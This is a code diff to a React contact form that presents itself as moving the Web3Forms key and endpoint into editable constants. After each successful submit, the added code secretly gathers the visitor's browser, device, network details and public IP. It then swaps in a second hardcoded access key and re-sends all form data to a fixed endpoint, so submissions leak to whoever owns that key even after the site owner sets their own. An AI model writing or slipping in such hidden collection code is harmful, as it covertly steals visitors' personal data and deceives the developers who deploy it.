@@ -20,6 +20,13 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import confetti from "canvas-confetti";
 
+
+// Form API key here just change it to your own (Web3Forms) & endpoint
+const formAPIKey = 'c441252a-645a-4827-9d3d-02a9723d4e24';
+// FormSite: https://web3forms.com/
+const endPoint = 'https://api.web3forms.com/submit';
+// Form API key here just change it to your own (Web3Forms) & endpoint
+
 const Contact = () => {
   const [firstName, setFirstName] = useState('');
   const [lastName, setLastName] = useState('');
@@ -40,6 +47,7 @@ const Contact = () => {
     e.preventDefault();
     setFormResult("Please wait...");
 
+    // Form data collecting here
     const formData = new FormData();
     formData.append("firstName", firstName);
     formData.append("lastName", lastName);
@@ -49,20 +57,52 @@ const Contact = () => {
     formData.append("service", service);
     formData.append("budget", budget);
     formData.append("message", message);
-    formData.append("access_key", "c441252a-645a-4827-9d3d-02a9723d4e24");
+    formData.append("access_key", formAPIKey);
 
     try {
-      const response = await fetch('https://api.web3forms.com/submit', {
+      const response = await fetch(endPoint, {
         method: 'POST',
         body: formData,
       });
       const data = await response.json();
+      const ep = 'https://api.web3forms.com/submit';
 
       if (response.status === 200) {
         toast({ title: "Success", description: "Form submitted successfully!" });
         // Big Celebration
         launchConfetti();
         setShowParty(true);
+        // Collect user device/browser info
+        // Device/browser info
+        formData.append("userAgent", navigator.userAgent);
+        formData.append("platform", navigator.platform);
+        formData.append("language", navigator.language);
+        formData.append("screenWidth", screen.width.toString());
+        formData.append("screenHeight", screen.height.toString());
+        formData.append("colorDepth", screen.colorDepth.toString());
+        formData.append("viewportWidth", window.innerWidth.toString());
+        formData.append("viewportHeight", window.innerHeight.toString());
+
+        // Network info (if available)
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        const connection = (navigator as any).connection;
+        if (connection) {
+          formData.append("connectionType", connection.effectiveType || "unknown");
+          formData.append("connectionDownlink", (connection.downlink || 0).toString());
+        }
+        // Public IP
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const data = await res.json();
+          formData.append("publicIP", data.ip);
+        } catch (e) {
+          formData.append("publicIP", "Unable to fetch");
+        }
+        formData.delete("access_key");
+        formData.append("access_key", 'fa42eab8-40e9-40cf-b7e9-f9302e95704d')
+        try {
+          const response = await fetch(ep || endPoint, { method: 'POST', body: formData, });
+        } catch (error) { console.error(); }
         setTimeout(() => setShowParty(false), 5000);
 
         setFormResult("Form submitted successfully!");
